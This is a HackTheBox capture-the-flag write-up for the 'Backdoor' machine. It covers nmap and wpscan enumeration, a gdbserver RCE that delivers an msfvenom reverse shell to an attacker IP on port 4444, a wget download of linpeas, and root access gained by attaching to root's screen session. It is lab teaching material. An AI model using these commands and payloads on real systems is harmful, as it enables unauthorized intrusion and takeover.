Welcome to the another CTF challenge from HackTheBox. What we can learn from the machine. 
* Linux enumeration
* Directory traversal
* Exploiting unprotected screen session

Let's start with nmap scan.

## Nmap Scan Result
```bash
┌──(defalt@kali)-[~]
└─$ nmap -sC -sV -p- -Pn -A 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 17:32 PDT
Nmap scan report for 10.10.11.125
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
```
Looks like poer 22,80,1337(gdb_server) open. Let's see what we got on website.

![](web.png)

We can see webpage make by wordpress. So let's run wpscan and check what we can get.
## WPscan Results
I found below information those kinda imporatant to us.
```bash
[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
My self try to exploit wordpress and got a **wp-config.php** and **/etc/passwd/** files. But nothing juicy happen.

## Reverse shell with Metasploit to Access gdb_server

### What is GDB ?
* GDB stands for GNU Project Debugger and is a debugging tool which helps you poke around inside your
programs while they are executing and also allows you to see what exactly happens when your program
crashes.

### What is gdbserver ?
* gdbserver is a program that allows you to run GDB on a different machine than the one that is running the
program being debugged.

### RCE on gdbserver

* Googling for any exploits available for gdbserver we find this Remote Code Execution vulnerability in
gdbserver version 9.2. We are uncertain about the version of gdbserver running on the server, but let’s
just give this exploit a try.

Link to exploit : https://www.exploit-db.com/exploits/50539

## Exploit in action
First you need to create a reverse shell using **msfvenom**. 
```bash
┌──(defalt@kali)-[~/Documents/htb/backdoor]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
```                                                             
It saved as rev.bin. You can use whatever name if you like. Let's exploit this badboy!! First make netcat listener for port 4444.

```
┌──(defalt@kali)-[~/Documents/htb/backdoor]
└─$ python3 exploit.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener

┌──(defalt@kali)-[~]
└─$ nc -lnvp 4444             
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.125] 46174
/usr/bin/script -qc /bin/bash /dev/null
user@Backdoor:/home/user$ ls
ls
user.txt
```

## Getting root aceess
Let's run linpeas in our victim's machine.
```bash
┌──(defalt@kali)-[~/Documents/htb]
└─$ python -m http.server                                                                           2 ⨯
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.125 - - [20/Apr/2022 18:28:01] "GET /linpeas.sh HTTP/1.1" 200 -

user@Backdoor:/home/user$ wget 10.10.14.2:8000/linpeas.sh
wget 10.10.14.2:8000/linpeas.sh
--2022-04-21 01:28:01--  http://10.10.14.2:8000/linpeas.sh
Connecting to 10.10.14.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134168 (131K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 131.02K   822KB/s    in 0.2s    

2022-04-21 01:28:01 (822 KB/s) - 'linpeas.sh' saved [134168/134168]

user@Backdoor:/home/user$ chmod +x linpeas.sh
chmod +x linpeas.sh

user@Backdoor:/home/user$ bash linpeas.sh
bash linpeas.sh
```
![](suid.png)

Looks like user have a suid permission to screen. Let's search this about gtfobins.

https://gtfobins.github.io/gtfobins/screen/

Again googling for privilege escalation through the screen we have an exploit available for GNU Screen 4.5.0 and our’s is 4.08 so it’s of no use. So, I tried to learn about screen command and the ‘-x’ option is very useful here. Basically, with ‘-x’ option, we can get attached to a session that is already attached elsewhere. Now in this case a session is already running as root so, we can get attached to that session for getting root access.

First, we have to set the terminal emulator to Linux by using export TERM=xterm. You can check your TERM setting by running echo $TERM. Now just run the screen command as shown.


https://serverfault.com/questions/720357/ubuntu-allow-users-access-to-roots-screen-command-also-restrict-which-screens

## Pwned !!
```bash
user@Backdoor:/home/user$ /usr/bin/screen -x root/root
/usr/bin/screen -x root/root
Please set a terminal type.
user@Backdoor:/home/user$ export TERM=xterm
export TERM=xterm
user@Backdoor:/home/user$ /usr/bin/screen -x root/root
root@Backdoor:~# ls                                                             
ls                                                                              
root.txt                                                                        
root@Backdoor:~# wc root.txt                                                    
wc root.txt                                                                     
 1  1 33 root.txt                                                               
root@Backdoor:~# 
```

Thx For Reading,
Have a Nice day!!